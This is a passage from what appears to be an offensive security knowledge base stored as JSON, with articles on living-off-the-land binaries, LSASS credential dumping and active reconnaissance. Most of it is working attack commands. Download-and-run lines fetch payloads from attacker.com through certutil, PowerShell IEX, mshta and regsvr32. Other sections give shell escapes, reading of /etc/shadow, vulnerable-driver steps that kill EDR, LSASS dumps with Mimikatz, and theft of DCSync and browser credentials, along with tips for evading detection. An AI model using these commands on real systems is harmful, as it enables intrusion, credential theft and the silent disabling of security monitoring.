the store's inventory against itself, and the cameras only see someone using \"normal\" store tools.\n\n## ◈ INTERMEDIATE\n\nUsing legitimate system binaries for offensive operations — download, code running, persistence, and lateral movement without dropping custom tools.\n\n## Windows LOLBAS — Download/Transfer\n\n**certutil**:\n```cmd\ncertutil -urlcache -split -f http://attacker.com/payload.exe C:\\temp\\payload.exe\ncertutil -urlcache -split -f http://attacker.com/payload.b64 C:\\temp\\payload.b64\ncertutil -decode C:\\temp\\payload.b64 C:\\temp\\payload.exe\n```\n\n**bitsadmin**:\n```cmd\nbitsadmin /transfer job /download /priority foreground http://attacker.com/payload.exe C:\\temp\\payload.exe\n```\n\n**PowerShell**:\n```powershell\nInvoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\n(New-Object Net.WebClient).DownloadFile('http://attacker.com/payload.exe','C:\\temp\\payload.exe')\nIEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stager.ps1')\n```\n\n**esentutl**:\n```cmd\nesentutl /y \\\\attacker.com\\share\\payload.exe /d C:\\temp\\payload.exe /o\n```\n\n**desktopimgdownldr**:\n```cmd\nset \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://attacker.com/payload.exe /q\n```\n\n## Windows LOLBAS — Code Running\n\n**mshta** (HTA files — bypasses AppLocker):\n```cmd\nmshta http://attacker.com/payload.hta\nmshta vbscript:Close(CreateObject(\"WScript.Shell\").Run(\"cmd /c payload.exe\"))\n```\n\n**regsvr32** (AppLocker bypass + download):\n```cmd\nregsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll\n```\n\n**MSBuild** (compile and run inline C# — AppLocker bypass):\n```cmd\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\temp\\build.xml\n:: build.xml contains inline C# task with payload\n```\n\n**InstallUtil** (assembly loading):\n```cmd\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\temp\\payload.dll\n```\n\n**rundll32**:\n```cmd\nrundll32.exe C:\\temp\\payload.dll,EntryPoint\nrundll32.exe shell32.dll,ShellExec_RunDLL \"cmd.exe\" \"/c payload.exe\"\n```\n\n**msiexec**:\n```cmd\nmsiexec /q /i http://attacker.com/payload.msi\n```\n\n**odbcconf**:\n```cmd\nodbcconf.exe /S /A {REGSVR C:\\Windows\\Temp\\payload.dll}\n```\n\n## Linux GTFOBins\n\n### Shell Escape from Restricted Environments\n\n```bash\n# vim/vi\nvim -c ':!/bin/bash'\n\n# awk\nawk 'BEGIN {spawn(\"/bin/bash\")}'\n\n# python/python3\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# perl\nperl -e 'exec \"/bin/bash\";'\n\n# less/more/man\n!/bin/bash\n\n# find\nfind / -name foo -or -quit\n\n# gdb\ngdb -nx -ex '!bash' -ex quit\n```\n\n### GTFOBins with sudo\n\n```bash\n# If sudo allows specific commands:\nsudo vim -c ':!/bin/bash'\nsudo awk 'BEGIN {spawn(\"/bin/bash\")}'\nsudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nsudo env /bin/bash\nsudo ftp # then: !/bin/bash\n```\n\n### GTFOBins with SUID\n\n```bash\n# If binary has SUID bit:\n./python3 -c 'import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'\n./find / -name foo -or -quit\n./env /bin/bash -p\n./bash -p\n```\n\n### GTFOBins for File Read/Write\n\n```bash\n# Read files as root via SUID/sudo:\nsudo cat /etc/shadow\nsudo xxd /etc/shadow | xxd -r\nsudo base64 /etc/shadow | base64 -d\n\n# Write files via SUID/sudo:\necho \"content\" | sudo tee /target/file\nsudo dd if=/tmp/evil of=/target/file\n```\n\n## LOLDrivers / BYOVD\n\nLoad a legitimate but vulnerable signed driver to disable EDR kernel callbacks:\n\n```powershell\n# Concept: load a signed driver with a known vulnerability\n# Use vulnerability to write arbitrary kernel memory\n# Zero out EDR driver's callback registrations\n# EDR loses visibility into process creation, image loads, thread creation\n\n# Well-known vulnerable drivers:\n# - Gigabyte driver (gdrv.sys / CVE-2018-19320)\n# - MSI Afterburner (RTCore64.sys)\n# - DBUtil_2_3.sys (Dell, CVE-2021-21551)\n# Full list: loldrivers.io\n\n# EDRSandblast: automates BYOVD EDR killing\n.\\EDRSandblast.exe --kernelmode # kill EDR via vulnerable driver + kernel callbacks patch\n.\\EDRSandblast.exe --usermode # unhook NTDLL user-mode hooks\n\nsc.exe create VulnDrv type= kernel binPath= C:\\Windows\\Temp\\vuln.sys\nsc.exe start VulnDrv\nsc.exe stop VulnDrv && sc.exe delete VulnDrv\n```\n\n## Reference Resources\n\n- **LOLBAS Project**: lolbas-project.github.io — searchable database of Windows LOTL binaries\n- **GTFOBins**: gtfobins.github.io — searchable database of Linux binaries for privilege escalation\n- **WADComs**: wadcoms.github.io — Windows AD offensive command reference\n- **LOLDrivers**: loldrivers.io — vulnerable driver database\n\n## OpSec Notes\n\n- LOLBAS usage is increasingly detected by EDR behavioral rules\n- certutil download generates distinctive command-line patterns (Event 1)\n- MSBuild inline C# compilation is monitored by Defender for Endpoint\n- PowerShell commands are logged in ScriptBlock/Module logging (Event 4103/4104)\n- Use less common LOLBAS (esentutl, desktopimgdownldr, pcalua) to avoid signatures\n- Combine LOLBAS with AMSI/ETW bypass for PowerShell-based techniques\n- Linux: GTFOBins exploitation leaves command history — clear or use non-logged methods\n\n## ◈ ADVANCED\n\n### Constrained Language Mode Bypass\n\nWhen PowerShell runs in Constrained Language Mode (CLM), many .NET calls are blocked. Bypass strategies:\n\n```\n1. Downgrade attack: invoke powershell.exe -version 2 (v2 has no CLM)\n Mitigation: disable PS v2 via Remove-WindowsFeature\n\n2. Alternate execution host: use mshta, cscript, or .NET directly via MSBuild/InstallUtil\n\n3. PowerShell runspace from unmanaged .NET assembly:\n Load a .NET binary that creates a PowerShell runspace with FullLanguage mode\n The binary (C#) runs outside CLM constraints\n\n4. COM object abuse: some COM servers provide scriptable interfaces that bypass CLM\n```\n\n### AppLocker Bypass in 2026 Enterprise\n\nModern AppLocker policies block most known LOLBins. Bypass via:\n\n```\n1. Trusted paths: if C:\\Windows\\Temp is in an allowed path, drop binaries there\n2. Installed software: enumerate installed apps in %ProgramFiles% — many are allowed\n3. Side-by-side (WinSxS): assemblies in WinSxS are always trusted\n4. Publisher rules: if code is signed with a trusted certificate, it bypasses rules\n5. MSI installer: msiexec often allowed; deploy payload inside MSI package\n6. User-writable trusted paths: find any writable directory under an allowed path\n```\n\n### Advanced BYOVD: Kernel Callback Removal Without Crash\n\nStandard BYOVD patches EDR callbacks but can destabilize the system. Safer approach:\n\n```\n1. Enumerate PsSetCreateProcessNotifyRoutine callbacks via kernel symbols\n2. Instead of zeroing, patch the first instruction to ret (single-byte patch: 0xC3)\n3. Original pointer remains valid — forensics sees registered callbacks\n4. Callback effectively disabled — EDR receives no notifications\n5. Restore original bytes before system shutdown/module unload\n```\n\nThis technique maintains the appearance of EDR functionality while silently disabling its process monitoring.\n\n### GTFOBins in Containerized Environments\n\nMany containers run with reduced capabilities but still have useful binaries:\n\n```bash\n# Python in container without exec permission on /tmp\n# Use memfd_create() to create anonymous file in memory\npython3 -c \"\nimport ctypes, mmap, os\nfd = ctypes.CDLL(None).memfd_create(b'test', 0)\n# Write binary to fd, fexecve()\n\"\n\n# nsenter escape (if hostPID + NET or SYS_PTRACE cap)\nnsenter -t 1 -m -u -i -n -p -- bash\n\n# capsh to check capabilities\ncapsh --print | grep Current\n```", "last_updated": "2026-03-18"}, "lsass-and-creds": {"slug": "lsass-and-creds", "title": "LSASS & Credential Material Handling", "category": "Post Exploitation", "content": "# LSASS & Credential Material Handling\n\n## ◈ BEGINNER\n\n### What is LSASS and Why Target It?\n\nLSASS (Local Security Authority Subsystem Service) is a critical Windows process (`lsass.exe`) that handles authentication for the operating system. When you log in to Windows, LSASS validates your credentials and stores your authentication material — NTLM hashes, Kerberos tickets, and sometimes plaintext passwords — in its process memory.\n\n**Why is LSASS the #1 target in Windows post-exploitation?**\nBecause it holds the keys to everything. On a server where administrators regularly log in, LSASS memory typically contains:\n- NTLM hashes of recently logged-in users (usable for Pass-the-Hash without cracking)\n- Kerberos tickets (usable for Pass-the-Ticket and lateral movement)\n- Sometimes plaintext passwords if WDigest is enabled\n- DPAPI master keys for decrypting encrypted credentials across the domain\n\n**Key terms:**\n- **NTLM hash** — Windows' password representation; can be used directly for authentication via Pass-the-Hash\n- **Kerberos ticket** — session authentication token; usable for Pass-the-Ticket attacks\n- **WDigest** — a legacy authentication protocol that caches plaintext passwords in LSASS; disabled by default on modern Windows but re-enableable\n- **SAM database** — local user password hash store; accessible from the registry\n- **NTDS.dit** — Active Directory database on Domain Controllers; contains hashes for all domain users\n- **DCSync** — a technique that impersonates a Domain Controller to request password replication, getting all domain hashes without touching LSASS\n- **RunAsPPL** — protection that makes LSASS harder to read, even for administrators\n- **Credential Guard** — hardware-based protection that moves credentials into a secure enclave, making LSASS dumping ineffective\n\n**Analogy:** LSASS is a digital keychain. Every time someone unlocks a door (authenticates) on the machine, LSASS keeps a copy of the key. Dumping LSASS gives you all the keys that have been used recently.\n\n## ◈ INTERMEDIATE\n\nDeep dive into LSASS process targeting, protection bypass, and credential extraction for red team operations.\n\n## LSASS Protection Mechanisms\n\n**RunAsPPL (Protected Process Light)**:\n```cmd\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL\n```\nWhen enabled, LSASS runs as a Protected Process Light, preventing standard process handle access even from administrators.\n\n**Credential Guard**: Uses Virtualization Based Security (VBS) to isolate credential material in VTL1 (Secure World). Protected credentials are inaccessible from the normal OS (VTL0). Check status:\n```powershell\nGet-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard |\n Select-Object SecurityServicesRunning, VirtualizationBasedSecurityStatus\n```\n\n## Dumping Methods Without Touching LSASS Directly\n\nWhen LSASS is heavily monitored, use alternative credential sources:\n\n**DCSync** (from domain-joined machine with replication rights):\n```bash\n# No LSASS access needed — pulls credentials via Directory Replication Service\nsecretsdump.py target.local/admin:password@dc01.target.local -just-dc-user administrator\nsecretsdump.py target.local/admin:password@dc01.target.local -just-dc # all users\n```\n\n**VSS Shadow Copy** (access LSASS memory snapshot offline):\n```cmd\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\sam\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\sys\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY C:\\temp\\sec\n```\n\n**ntdsutil IFM** (on Domain Controller):\n```cmd\nntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ifm\" quit quit\n```\n\n## LSASS Dump Methods\n\n**comsvcs.dll MiniDump** (LOLBIN — no external tools):\n```cmd\n:: Get LSASS PID\ntasklist /fi \"imagename eq lsass.exe\"\n:: Dump via rundll32\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump PID C:\\temp\\lsass.dmp full\n```\n\n**Nanodump** (evasive — forks LSASS, dumps the clone):\n```cmd\n:: Fork LSASS, dump the forked process, avoid direct handle to real LSASS\nnanodump.exe --fork --write C:\\temp\\nano.dmp\n:: Variants: write to pipe, XOR-encrypt output, avoid MiniDumpWriteDump API\n```\n\n**Handle Duplication** (steal existing handle):\n```\nSome processes already have handles to LSASS (antivirus, monitoring tools)\nEnumerate system handles via NtQuerySystemInformation\nFind process with existing LSASS handle\nDuplicate the handle to your process\nUse duplicated handle for dump\n```\n\n## Offline Credential Extraction\n\n```bash\n# pypykatz (Python Mimikatz — works on Linux)\npypykatz lsa minidump lsass.dmp\n\n# Mimikatz\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords\n\n# Output includes: NTLM hashes, Kerberos tickets, WDigest plaintext (if enabled),\n# DPAPI master keys, SSP credentials\n```\n\n## Mimikatz Module Reference\n\n| Module | Command | Purpose |\n|--------|---------|---------|\n| sekurlsa | logonpasswords | Dump all available credentials from LSASS |\n| sekurlsa | wdigest | WDigest plaintext passwords |\n| sekurlsa | kerberos | Kerberos tickets |\n| lsadump | dcsync | DCSync — replicate credentials from DC |\n| lsadump | sam | SAM database hashes |\n| lsadump | backupkeys | DPAPI domain backup keys |\n| dpapi | cred | Decrypt DPAPI credential blobs |\n| token | elevate | Impersonate SYSTEM token |\n| misc | memssp | Install SSP that logs plaintext credentials |\n\n## Credential Guard Alternatives\n\nWhen Credential Guard is active, traditional LSASS dumping yields empty results:\n\n1. **DCSync** — pulls from DC directly, not from local LSASS\n2. **ADCS certificate theft** — request certificate, authenticate via PKINIT\n3. **DPAPI offline with domain backup key** — decrypt credential blobs using the domain backup key\n4. **Kerberoasting/ASREPRoasting** — request tickets offline, crack hashes\n5. **Shadow Credentials** — add KeyCredential to user object, authenticate via certificate\n6. **Token impersonation** — use existing logon tokens (not from LSASS)\n\n## Browser Credential Extraction\n\n```bash\n# SharpChrome: extract Chrome/Edge credentials\n.\\SharpChrome.exe logins # current user Chrome logins\n.\\SharpChrome.exe cookies /host:github.com # specific site cookies\n\n# HackBrowserData: multi-browser credential extractor\n./hack-browser-data -b all -f json -o /tmp/creds\n\n# Firefox\npython3 firepwd.py -d ~/.mozilla/firefox/*.default/\n```\n\n## OpSec Notes\n\n- LSASS access generates Sysmon Event 10 with specific access masks (0x1010, 0x1410, 0x1438)\n- EDRs specifically monitor for: OpenProcess on LSASS, MiniDumpWriteDump calls, comsvcs.dll MiniDump command line\n- DCSync generates Event 4662 with replication-related GUIDs\n- comsvcs.dll MiniDump is now signatured — EDRs detect the command line pattern\n- Nanodump with fork is currently the stealthiest direct dump method\n- Handle duplication avoids opening a new handle to LSASS — evades handle-based detection\n- Always prefer DCSync or ADCS over direct LSASS dumping when possible\n\n## ◈ ADVANCED\n\n### Memory-Only NTLM Extraction (No Dump File)\n\nParse LSASS structures directly without creating a dump file — evades dump-detection heuristics:\n\n```\nApproach:\n1. Open LSASS with PROCESS_VM_READ + PROCESS_QUERY_INFORMATION\n2. Parse lsasrv.dll export table to locate LogonSessionList symbol\n3. Walk the LogonSessionList doubly-linked list\n4. For each session: decrypt NTLM hash using LSA key (in lsasrv.dll memory)\n5. Output directly — no dump file created = no file-based detection\n\nLSA key location: lsasrv.dll global variable (version-specific offset)\nNTLM hash encryption: AES-128 with key material from lsasrv.dll globals\n\nTools using this approach:\n- Cobalt Strike's hashdump BOF\n- Custom C2 credential modules\n- Mimikatz sekurlsa with direct memory reading (in-process)\n```\n\n### PPL Bypass via Vulnerable Signed Driver\n\nTo access RunAsPPL-protected LSASS:\n\n```\n1. Load a vulnerable signed driver (gdrv.sys, DBUtil_2_3.sys, etc.)\n2. Use the driver's kernel R/W vulnerability to modify LSASS EPROCESS structure\n3. Clear the PS_PROTECTED_SIGNER field in EPROCESS (offset varies by OS version)\n4. LSASS is now unprotected — open with standard admin privileges\n5. Dump, extract, clean up\n\nTools: PPLKiller, PPLdump (uses Windows error reporting mechanism)\n\nDetection: driver loading (Event 4697), unusual EPROCESS writes (ETW-Threat-Intelligence)\n```\n\n### DPAPI Domain-Wide Credential Decryption\n\nThe DPAPI domain backup key unlocks ALL domain users' DPAPI-protected data:\n\n```bash\n# Extract domain backup key (requires DA)\nmimikatz \"lsadump::backupkeys /system:dc01.corp.local /export\"\n\n# Now decrypt any user's DPAPI blobs domain-wide\nSharpDPAPI.exe credentials /pvk:backup_key.pvk\nSharpDPAPI.exe masterkeys /pvk:backup_key.pvk\n\n# Decrypt all Chrome/Edge saved passwords domain-wide\nSharpChrome.exe logins /pvk:backup_key.pvk\n```\n\nThis single key decrypts browser passwords, credential manager entries, and certificate private keys for all domain users — indefinitely (key doesn't change unless explicitly rotated).\n\n### Password Manager Attack Chains\n\n```bash\n# KeePass CVE-2023-32784: extract master password from process memory\n# Works while KeePass is running (memory contains typed characters)\ndotnet run -- /proc/$(pgrep KeePass)/mem # Linux\n# Windows: procdump, then analyze dump with PoC\n\n# Hashcat KeePass offline attack\nkeepass2john database.kdbx > keepass.hash\nhashcat -m 13400 keepass.hash wordlist.txt\n\n# Bitwarden/1Password: if session token in environment\nbw list items --session $BW_SESSION\nop item list --vault \"Personal\"\n```", "last_updated": "2026-03-18"}, "active-recon": {"slug": "active-recon", "title": "Active Reconnaissance", "category": "Reconnaissance", "content": "# Active Reconnaissance\n\n## ◈ BEGINNER\n\n### What is Active Reconnaissance?\n\nActive reconnaissance means you're directly interacting with target systems to gather information. Unlike passive recon (where you observe from a distance without touching the target), active recon generates traffic that reaches the target and may leave traces in logs.\n\n**Key terms:**\n- **Port scanning** — probing a machine to see which network ports are open (i.e., which services are listening)\n- **Service enumeration** — identifying what software is running on an open port and what version it is\n- **Subdomain discovery** — finding all web domains that belong to an organization (e.g., `mail.company.com`, `vpn.company.com`)\n- **Banner grabbing** — reading the introductory message a service sends when you connect to it (often reveals software version)\n- **NSE** — Nmap Scripting Engine; built-in scripts for automated service-specific tests\n- **DNS** — Domain Name System; translates domain names to IP addresses\n\n**Why does port scanning matter?**\nA port is like a numbered door on a building. Some doors are open (services listening), others are closed. Knowing which \"doors\" are open tells you what services to investigate. Each service is a potential entry point.\n\n**Common ports to know:**\n- `22` — SSH (remote shell, usually Linux)\n- `80/443` — HTTP/HTTPS (web server)\n- `445` — SMB (Windows file sharing)\n- `3389` — RDP (Windows remote desktop)\n- `1433` — MSSQL database\n- `389/636` — LDAP/LDAPS (Active Directory)\n\n**What is a WAF?** A Web Application Firewall — a security device that sits in front of web servers and blocks malicious requests. You need to detect and potentially bypass it before testing web applications.\n\n**Analogy:** Active recon is like walking up to a building, knocking on doors, and checking which ones open. You'll leave footprints — do it carefully and from the right starting position.\n\n**Risk:** Active recon is detectable. IDS/IPS systems, EDR, and firewalls log and alert on scanning activity. Always operate from infrastructure that won't burn your engagement if detected.\n\n## ◈ INTERMEDIATE\n\nActive recon involves direct interaction with target systems. This generates network traffic and log entries that may trigger alerts.\n\n## Port Scanning\n\n**Nmap** remains the gold standard. Key scan strategies:\n\n```bash\n# SYN scan (default, fast, stealthy — requires root)\nnmap -sS -p- -T4 --min-rate=1000 -oA full_syn target.com\n\n# TCP connect scan (no root needed, noisier)\nnmap -sT -p 80,443,8080,8443 target.com\n\n# UDP scan (slow, essential for SNMP/DNS/TFTP)\nnmap -sU --top-ports 200 -T4 target.com\n\n# Version and script scan on discovered ports\nnmap -sV -sC -p 22,80,443,445,3389 -oA detailed target.com\n\n# OS fingerprinting\nnmap -O --osscan-guess target.com\n```\n\n**masscan** for speed on large ranges (entire /16 in minutes):\n\n```bash\nmasscan 10.0.0.0/16 -p 1-65535 --rate=10000 -oJ masscan_results.json\n```\n\n**rustscan** and **naabu** provide fast port discovery as Nmap alternatives:\n\n```bash\nnaabu -host target.com -p - -rate 5000 -o ports.txt\nrustscan -a target.com --ulimit 5000 -- -sV -sC\n```\n\n## Nmap NSE Scripts\n\nNSE scripts provide targeted service enumeration:\n\n```bash\n# SMB enumeration\nnmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 target\n\n# HTTP enumeration\nnmap --script http-enum,http-headers,http-methods -p 80,443 target\n\n# Vulnerability scanning\nnmap --script vuln -p 80,443 target\n\n# SSL/TLS analysis\nnmap --script ssl-enum-ciphers,ssl-cert -p 443 target\n```\n\n## DNS Enumeration\n\nSubdomain discovery is critical for expanding attack surface:\n\n```bash\n# Passive subdomain enumeration\nsubfinder -d target.com -all -o subs.txt\nassetfinder --subs-only target.com >> subs.txt\n\n# Active DNS brute-force\ndnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o dnsx_brute.txt\n\n# DNS resolution and filtering live hosts\ncat subs.txt | sort -u | dnsx -silent -a -resp -o resolved.txt\n\n# Permutation/alteration discovery\naltdns -i subs.txt -o altered.txt -w words.txt -r -s resolved_altered.txt\n\n# Zone transfer (rare but devastating when found)\ndig axfr @ns1.target.com target.com\n```\n\n## WAF Detection & Bypass\n\nIdentify WAF before attacking web applications:\n\n```bash\nwafw00f https://target.com\n```\n\nCDN bypass techniques: find the origin IP behind CloudFlare/Akamai using historical DNS records (SecurityTrails), certificate search (Censys), or by finding subdomains that resolve directly to the origin. Check `mail.target.com`, `ftp.target.com`, or internal subdomains that may bypass CDN.\n\n## Virtual Host Discovery\n\n```bash\n# Discover vhosts on shared hosting\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n -u https://TARGET_IP -H \"Host: FUZZ.target.com\" -fs 0\n\n# Compare response sizes to filter false positives\n```\n\n## Content Discovery\n\n```bash\n# Directory brute-force\nferoxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,asp,aspx,jsp -t 50\n\n# Recursive with extensions\ngobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50 -o gobuster.txt\n\n# ffuf for flexible fuzzing\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -fc 404\n```\n\n## Banner Grabbing\n\n```bash\n# Netcat banner grab\nnc -v target.com 22\nnc -v target.com 25\n\n# Curl for HTTP headers\ncurl -I -s https://target.com\n\n# OpenSSL for TLS services\necho | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject -issuer -dates\n```\n\n## Port Knocking Detection\n\nSome services hide behind port knocking sequences. Use `nmap` with timing analysis or try common knock sequences. `knockd` configurations may be found through other compromise vectors.\n\n## OpSec Considerations\n\n- SYN scans are logged by IDS/IPS — use `--scan-delay` and fragmentation (`-f`) to reduce signature matching\n- Scan from infrastructure with appropriate categorization (cloud VPS, not residential IP)\n- Distribute scans over time to avoid rate-based alerts\n- Use `--randomize-hosts` with Nmap to avoid sequential scanning patterns\n- Consider scanning through Tor/VPN for initial reconnaissance, then switching to dedicated infrastructure for active exploitation\n\n## Detection Notes\n\nPort scans generate connection logs. IDS signatures (Snort/Suricata) detect Nmap fingerprinting. Aggressive scanning with high packet rates triggers rate-based alerts. NSE script scans are particularly noisy as they generate application-layer traffic. Modern EDR correlates network scanning with endpoint events.\n\n---\n\n## LDAP Enumeration\n\nLDAP (port 389/636) on domain controllers exposes extensive AD information:\n\n```bash\n# Anonymous bind (common in older environments)\nldapsearch -x -H ldap://192.168.1.10 -b \"DC=corp,DC=local\"\nldapsearch -x -H ldap://192.168.1.10 -b \"\" -s base \"(objectclass=*)\" namingContexts\n\n# Authenticated enumeration\nldapsearch -x -H ldap://192.168.1.10 -D \"user@corp.local\" -w \"password\" \\\n -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName mail\n\n# Enumerate all users\nldapsearch -x -H ldap://192.168.1.10 -D \"user@corp.local\" -w \"pass\" \\\n -b \"DC=corp,DC=local\" \"(&(objectClass=user)(objectCategory=person))\" \\\n sAMAccountName userPrincipalName memberOf\n\n# Enumerate domain admins\nldapsearch -x -H ldap://192.168.1.10 -D \"user@corp.local\" -w \"pass\" \\\n -b \"CN=Domain Admins,CN=Users,DC=corp,DC=local\" member\n\n# enum4linux-ng (Python rewrite, more reliable)\npip3 install enum4linux-ng\nenum4linux-ng -A 192.168.1.10 # all checks\nenum4linux-ng -A -u user -p pass 192.168.1.10 # authenticated\n\n# windapsearch\npython3 windapsearch.py -d corp.local -u user@corp.local -p pass --da\npython3 windapsearch.py -d corp.local -u user@corp.local -p pass -U # all users\npython3 windapsearch.py -d corp.local -u user@corp.local -p pass -C # all computers\n```\n\n---\n\n## SMB Enumeration\n\n```bash\n# Null session enumeration (older systems)\nsmbclient -L //192.168.1.10 -N\nsmbmap -H 192.168.1.10 -u \"\" -p \"\"\n\n# Authenticated\nsmbclient -L //192.168.1.10 -U user%password\nsmbmap -H 192.168.1.10 -u user -p password\n\n# CrackMapExec SMB recon\ncme smb 192.168.1.0/24 # host discovery\ncme smb 192.168.1.10 -u user -p pass --shares # list shares\ncme smb 192.168.1.10 -u user -p pass --users # enumerate users\ncme smb 192.168.1.10 -u user -p pass --groups # enumerate groups\ncme smb 192.168.1.10 -u user -p pass --pass-pol # password policy\n\n# Spider shares for sensitive files\ncme smb 192.168.1.10 -u user -p pass -M spider_plus\ncme smb 192.168.1.10 -u user -p pass --spider C$ --pattern \"password|cred|secret\"\n```\n\n## ◈ ADVANCED\n\n### Scan Timing and Evasion\n\nModern IDS/IPS systems detect scanning patterns by correlating events across time. Defeat them with slow, fragmented, and randomized scanning:\n\n```bash\n# Extremely slow scan — 1 packet per second, fragmented\nnmap -sS -T1 --scan-delay 2s -f --data-length 25 --randomize-hosts \\\n -p 80,443,445,3389,22 target-range.com\n\n# Source port spoofing (makes scan look like DNS responses)\nnmap -sS --source-port 53 -p 1-1000 target.com\n\n# Decoy scanning — mix real scan packets with spoofed decoy sources\nnmap -sS -D RND:10 target.com\n\n# Fragment packets to confuse signature matching\nnmap -sF -f --mtu 8 target.com\n```\n\n### Application-Layer Fingerprinting Without Scanning\n\nSkip noisy port scans entirely — fingerprint services at the application layer using existing legitimate protocols:\n\n```bash\n# TLS certificate enumeration reveals software stack\nsslyze --regular target.com:443\n\n# HTTP/2 fingerprinting (server implementations have distinct behavior)\nh2fingerprint target.com\n\n# JA3/JA3S TLS fingerprinting from packet captures\n# Identifies server software by TLS handshake patterns\nzeek -r capture.pcap -C -e 'print ssl_handshake_stats'\n```\n\n### Automated Recon Pipeline\n\nBuild a fully automated recon-to-exploitation pipeline:\n\n```bash\n#!/bin/bash\n# recon-pipeline.sh TARGET\nTARGET=$1\nOUT=\"recon-$TARGET-$(date +%s)\"\nmkdir -p $OUT\n\n# 1. Passive subdomain harvest\nsubfinder -d $TARGET -all -silent | tee $OUT/subs-passive.txt\n\n# 2. Active DNS brute\ndnsx -d $TARGET -w subs-top1m.txt -silent | tee $OUT/subs-active.txt\n\n# 3. Resolve + HTTP probe\ncat $OUT/subs-*.txt | sort -u | dnsx -silent | \\\n httpx -silent -status-code -title -tech-detect | tee $OUT/live-hosts.txt\n\n# 4. Targeted port scan on discovered assets\nawk '{print $1}' $OUT/live-hosts.txt | \\\n naabu -p 80,443,8080,8443,8888,3000,4000,5000,9000 -silent | \\\n tee $OUT/ports.txt\n\n# 5. Screenshot all live web assets\ncat $OUT/live-hosts.txt | cut -d' ' -f1 | \\\n gowitness file -f - --destination $OUT/screenshots/\n```\n\n### Cloud Asset Discovery\n\nModern organizations sprawl across multiple cloud accounts. Enumerate them:\n\n```bash\n# AWS account ID from public bucket policy\ncurl -s https://TARGET-BUCKET.s3.amazonaws.com/ | \\\n python3 -c \"import sys; data=sys.stdin.read(); print(data)\"\n\n# Azure tenant discovery\ncurl \"https://login.microsoftonline.com/TARGET.onmicrosoft.com/v2.0/.well-known/openid-configuration\" | jq .\n\n# Google Workspace/GCP asset discovery\ncurl \"https://www.googleapis.com/discovery/v1/apis\" | \\\n python3 -c \"import sys,json; [print(x['rootUrl']) for x in json.load(sys.stdin)['items'] if 'TARGET' in x.get('rootUrl','')]\"\n\n# Certificate Transparency for cloud subdomains\ncurl -s \"https://crt.sh/?q=%.target.com&output=json\" | \\\n jq -r '.[].name_value' | sort -u | grep -v '\\*'\n```\n\n### Post-Foothold Internal Recon via LDAP\n\nOnce inside a domain, extract maximum AD intelligence without spawning suspicious processes:\n\n```bash\n# Direct LDAP query for all Kerberoastable accounts\nldapsearch -x -H ldap://DC_IP -D \"user@corp.local\" -w \"pass\" \\\n -b \"DC=corp,DC=local\" \\\n \"(&(servicePrincipalName=*)(!(objectClass=computer))(!(cn=krbtgt)))\" \\\n sAMAccountName servicePrincipalName pwdLastSet\n\n# Find AS-REP roastable accounts (no preauth required)\nldapsearch -x -H ldap://DC_IP -D \"user@corp.local\" -w \"pass\" \\\n -b \"DC=corp,DC=local\" \\\n \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" \\\n sAMAccountName\n\n# Find unconstrained delegation computers\nldapsearch -x -H ldap://DC_IP -D \"user@corp.local\" -w \"pass\" \\\n -b \"DC=corp,DC=local\" \\\n \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" \\\n cn dNSHostName\n```\n\nThese queries are indistinguishable from normal domain-joined application behavior in most environments.", "last_updated": "2026-03-18"}, "network-mapping": {"slug": "network-mapping", "title": "Network Topology Mapping", "category": "Reconnaissance", "content": "# Network Topology Mapping\n\n## ◈ BEGINNER\n\n### What is Network Topology Mapping?\n\nOnce you have a foothold inside a network, you need to understand the layout of that network — what machines exist, how they're connected, and where the valuable targets are. This is network topology mapping.\n\n**Key terms:**\n- **Subnet** — a logical grouping of IP addresses (e.g., `192.168.1.0/24` covers 254 addresses)\n- **ARP** — Address Resolution Protocol; how computers on the same network segment find each other's hardware addresses\n- **VLAN** — Virtual LAN; a logical network segment that separates traffic even over shared physical cables\n- **SNMP** — Simple Network Management Protocol; used to monitor and manage network devices, often exposes configuration data\n- **Pivot point** — a compromised machine with connections to multiple network segments, used as a relay\n- **Dual-homed** — a machine with two network interfaces connected to different networks (excellent pivot point)\n- **NetBIOS** — an older Windows naming protocol; reveals Windows machine names on the network\n- **mDNS** — multicast DNS; used by Apple devices and Linux for local network discovery\n\n**Why map the network?**\nYou might compromise a single workstation, but the real targets (domain controllers, file servers, databases) are elsewhere. Mapping shows you where to go and how to get there.\n\n**The internal recon priority order:**\n1. What subnet am I on?\n2. What other subnets can I reach?\n3. What 